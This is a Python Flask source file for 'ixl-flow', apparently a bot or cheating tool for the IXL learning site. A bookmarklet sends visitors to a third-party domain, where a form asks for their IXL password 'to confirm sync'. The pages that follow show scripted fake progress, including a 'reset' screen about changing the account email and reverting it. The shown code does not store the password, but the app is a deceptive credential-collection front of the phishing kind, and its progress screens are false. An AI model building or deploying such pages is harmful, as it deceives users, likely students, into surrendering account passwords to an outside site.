from flask import Flask, request, render_template_string

app = Flask(__name__)

# --- STYLES (Black & Glowing Pink) ---
STYLE = """
<style>
    body { background-color: #020202; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .card { background: #080808; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 0 40px rgba(255, 20, 147, 0.15); width: 380px; border: 1px solid #1a1a1a; }
    h1 span, h2 { color: #ff1493; text-shadow: 0 0 15px rgba(255, 20, 147, 0.7); font-weight: 800; }
    .step { background: #111; padding: 15px; border-radius: 12px; margin: 12px 0; text-align: left; border-left: 4px solid #ff1493; font-size: 14px; }
    input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #222; background: #000; color: white; box-sizing: border-box; outline: none; }
    input:focus { border-color: #ff1493; box-shadow: 0 0 10px rgba(255, 20, 147, 0.3); }
    .btn-glow { background: #ff1493; color: white; padding: 14px 20px; border-radius: 30px; font-weight: bold; text-decoration: none; border:none; width: 100%; cursor: pointer; text-transform: uppercase; display: block; box-shadow: 0 0 20px rgba(255, 20, 147, 0.4); transition: 0.3s; }
    .btn-glow:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(255, 20, 147, 0.6); }
    .link-alt { color: #444; font-size: 12px; text-decoration: none; display: block; margin-top: 20px; }
    .link-alt:hover { color: #ff1493; }
    ul { list-style: none; padding: 0; text-align: left; }
    li { margin: 15px 0; color: #222; font-size: 14px; display: flex; align-items: center; text-transform: lowercase; }
    li.done { color: #ff1493; text-shadow: 0 0 5px #ff1493; }
    li.active { color: #ff1493; font-weight: bold; animation: glow 1.5s infinite alternate; }
    .dot { height: 6px; width: 6px; border-radius: 50%; display: inline-block; margin-right: 12px; background: #1a1a1a; }
    li.done .dot { background: #ff1493; box-shadow: 0 0 10px #ff1493; }
    li.active .dot { background: #ff1493; box-shadow: 0 0 15px #ff1493; }
    @keyframes glow { from { opacity: 0.5; } to { opacity: 1; } }
</style>
"""

@app.route('/')
def home():
    # The updated bookmarklet points back to YOUR domain directly
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h1>ixl-<span>flow</span></h1>
            <div class="step"><strong>1.</strong> Login to IXL in a new tab.</div>
            <div class="step"><strong>2.</strong> Drag this to your Bookmarks:</div>
            <a class="btn-glow" href="javascript:(function(){{window.location.href='https://ixl-bot-v2.onrender.com/login';}})();">IXL SYNC</a>
        </div>
    </body></html>
    """)

@app.route('/login')
def login():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h2>link your IXL account</h2>
            <p style="color: #666; font-size: 12px; margin-bottom: 20px;">Enter your IXL password to confirm sync.</p>
            <form action="/run" method="POST">
                <input type="password" name="password" placeholder="your ixl password" required>
                <button type="submit" class="btn-glow">check password</button>
            </form>
            <a href="/reset" class="link-alt">I don't know my password</a>
        </div>
    </body></html>
    """)

@app.route('/reset')
def reset():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h2 style="color: #ff1493; margin-bottom: 30px;">resetting password</h2>
            <ul>
                <li class="done"><span class="dot"></span>setting email</li>
                <li class="done"><span class="dot"></span>resetting password</li>
                <li class="active"><span class="dot"></span>waiting for reset...</li>
                <li><span class="dot"></span>logging back in</li>
                <li><span class="dot"></span>reverting email</li>
            </ul>
        </div>
    </body></html>
    """)

@app.route('/run', methods=['POST'])
def run():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h2>syncing dashboard...</h2>
            <ul>
                <li class="active"><span class="dot"></span>connecting to servers</li>
                <li><span class="dot"></span>injecting flow-ui</li>
                <li><span class="dot"></span>finalizing</li>
            </ul>
        </div>
        <script>setTimeout(function(){{ window.location.href='/'; }}, 4000);</script>
    </body></html>
    """)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
